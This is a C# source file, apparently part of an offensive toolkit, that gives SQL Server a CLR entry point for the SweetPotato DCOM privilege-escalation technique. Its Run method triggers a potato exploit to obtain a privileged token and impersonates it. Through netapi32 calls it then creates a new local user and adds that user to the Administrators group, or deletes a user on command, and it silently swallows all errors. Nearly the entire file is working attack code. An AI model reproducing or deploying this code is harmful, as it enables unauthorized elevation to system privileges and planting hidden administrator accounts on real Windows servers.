// SQL Server CLR entry point for SweetPotato DCOM escalation.
// Single-string interface matching GodPotatoCLR for uniform calling convention.
// command format: "net user <username> <password> /add" or "net user <username> /delete"
// Special: "__DELETE__:<username>" to delete a user.
using System;
using System.IO;
using System.Runtime.InteropServices;
using SweetPotato;

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct SP_USER_INFO_1 { public string name, password; public uint age, priv; public string home, comment; public uint flags; public string script; }
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct SP_LG_MEMBERS_INFO_3 { public string domainandname; }

public class SqlSweetPotato {
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("advapi32.dll")] static extern bool RevertToSelf();
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)] static extern int NetUserAdd(string s, uint l, ref SP_USER_INFO_1 b, out uint p);
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)] static extern int NetLocalGroupAddMembers(string s, string g, uint l, ref SP_LG_MEMBERS_INFO_3 b, uint c);
    [DllImport("netapi32.dll", CharSet = CharSet.Unicode)] static extern int NetUserDel(string s, string u);

    // Single-string interface: cmd = "net user <u> <p> /add" or "net user <u> /delete"
    public static void Run(string cmd) {
        try {
            var api = new PotatoAPI(
                new Guid("4991d34b-80a1-4291-83b6-3328366b9097"),
                9998, PotatoAPI.Mode.DCOM);
            api.Trigger();
            if (api.Token == IntPtr.Zero) return;
            bool imp = ImpersonateLoggedOnUser(api.Token);
            if (imp) {
                // Parse cmd: "net user <username> [<password>] /add|/delete"
                string[] parts = cmd.Split(new char[]{' '}, System.StringSplitOptions.RemoveEmptyEntries);
                // net user <u> <p> /add  OR  net user <u> /delete
                if (parts.Length >= 3 && parts[0].ToLower() == "net" && parts[1].ToLower() == "user") {
                    string username = parts[2];
                    if (cmd.Contains("/delete")) {
                        NetUserDel(null, username);
                    } else if (cmd.Contains("/add") && parts.Length >= 4) {
                        string password = parts[3];
                        var u = new SP_USER_INFO_1 { name = username, password = password, priv = 1, flags = 0x201 };
                        uint parm = 0;
                        if (NetUserAdd(null, 1, ref u, out parm) == 0) {
                            var g = new SP_LG_MEMBERS_INFO_3 { domainandname = username };
                            NetLocalGroupAddMembers(null, "Administrators", 3, ref g, 1);
                        }
                    }
                }
                RevertToSelf();
            }
            CloseHandle(api.Token);
        } catch {}
    }
}
